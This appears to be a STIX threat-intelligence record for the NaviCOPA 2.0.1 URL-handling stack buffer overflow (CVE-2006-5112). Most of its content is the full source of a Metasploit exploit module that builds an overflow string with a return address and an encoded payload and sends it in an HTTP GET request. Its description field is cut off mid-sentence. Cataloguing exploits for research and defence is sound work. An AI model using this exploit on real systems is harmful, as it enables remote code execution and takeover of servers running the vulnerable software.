{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c95bf7b-6a17-4071-b436-e303bfcea2f0",
    "created": "2024-08-14T16:55:00.66281Z",
    "modified": "2024-08-14T16:55:00.662815Z",
    "name": "NaviCOPA 2.0.1 URL Handling Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in NaviCOPA 2.0.1. The vulnerability is caused due to a boundary error within the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/navicopa_get_overflow.rb",
            "external_id": "navicopa_get_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5112"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /InterVations/ ] }\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NaviCOPA 2.0.1 URL Handling Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in NaviCOPA 2.0.1.\n        The vulnerability is caused due to a boundary error within the\n        handling of URL parameters.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-5112' ],\n          [ 'OSVDB', '29257' ],\n          [ 'BID', '20250' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['NaviCOPA 2.0.1 Universal', { 'Ret' => 0x1009b4ff }], # IV320009.dll\n        ],\n      'DisclosureDate' => '2006-09-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n  end\n\n  def check\n    connect\n\n    sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n    resp = sock.get_once\n    disconnect\n\n    if (resp =~ /2\\.01 11th September/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    sploit =  rand_text_alphanumeric(228, payload_badchars)\n    sploit << [target.ret].pack('V') + payload.encoded\n\n    uri = '/' + sploit\n\n    res = \"GET #{uri} HTTP/1.1\\r\\n\\r\\n\"\n\n    print_status(\"Trying target %s\" % target.name)\n\n    sock.put(res)\n    sock.close\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_contributors": [
        "MC",
        ""
    ],
    "x_mitre_disclosure_date": "2006-09-28",
    "x_mitre_platforms": [
        "win'"
    ]
}